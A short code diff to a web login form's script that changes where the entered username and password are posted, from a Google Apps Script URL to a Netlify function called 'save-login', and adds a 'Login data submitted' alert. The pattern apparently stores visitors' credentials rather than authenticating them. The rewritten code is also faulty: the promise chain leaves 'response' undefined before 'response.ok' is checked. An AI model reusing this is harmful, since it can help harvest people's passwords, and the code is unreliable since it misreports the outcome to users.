@@ -62,11 +62,20 @@ loginForm.addEventListener('submit', async (e) => {
   loginBtn.disabled = true;
 
   try {
-    const response = await fetch("https://script.google.com/macros/s/AKfycbxs00xqpCHYp7hX1odgT7eqiijQlhUKUAPk5HZ0tHwjpPnldkBL9GQtqPPQbpkGjBuu/exec", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ username, password })
-    });
+    const response = await fetch("/.netlify/functions/save-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username, password })
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log("Saved:", data);
+        alert("Login data submitted successfully.");
+      })
+      .catch(err => {
+        console.error("Error:", err);
+        alert("Submission failed.");
+      });
 
     if (response.ok) {
       showMessage('Successfully logged in!', 'success');
